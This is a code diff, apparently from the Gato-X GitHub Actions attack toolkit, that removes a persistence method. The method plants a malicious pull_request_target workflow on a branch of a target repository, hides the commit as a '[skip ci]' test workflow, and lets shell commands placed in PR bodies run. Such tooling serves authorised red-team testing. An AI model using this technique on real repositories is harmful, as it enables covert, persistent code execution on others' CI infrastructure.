@@ -20,7 +20,6 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 
 from gatox.attack.attack import Attacker
-from gatox.attack.payloads.payloads import Payloads
 from gatox.cli.output import Output
 
 logger = logging.getLogger(__name__)
@@ -132,48 +131,4 @@ class PersistenceAttack(Attacker):
             Output.error(f"Failed to create deploy key for {target_repo}")
             return False
 
-    async def create_pwn_request_workflow(
-        self, target_repo: str, branch_name: str = None
-    ):
-        """Create a malicious pull_request_target workflow on a non-default branch.
 
-        Args:
-            target_repo (str): Repository to target (org/repo format)
-            branch_name (str): Branch name to create the workflow on
-
-        Returns:
-            bool: True if successful, False otherwise
-        """
-        if not await self.setup_user_info():
-            return False
-
-        if not branch_name:
-            branch_name = "feature/test-workflow"
-
-        Output.info(
-            f"Creating malicious pull_request_target workflow on {target_repo}:{branch_name}"
-        )
-
-        # Get workflow content from payloads
-        workflow_content = Payloads.PWN_REQUEST_WORKFLOW.format(branch_name)
-
-        result = await self.api.create_workflow_on_branch(
-            target_repo,
-            branch_name,
-            "pwn-request.yml",
-            workflow_content,
-            commit_message="[skip ci] Add test workflow",
-            commit_author=self.author_name,
-            commit_email=self.author_email,
-        )
-
-        if result:
-            Output.result(
-                f"Successfully created malicious workflow on {target_repo}:{branch_name}"
-            )
-            Output.info(f"To trigger: Create a PR targeting the '{branch_name}' branch")
-            Output.info("Include shell commands in the PR body to execute them")
-            return True
-        else:
-            Output.error(f"Failed to create workflow on {target_repo}:{branch_name}")
-            return False
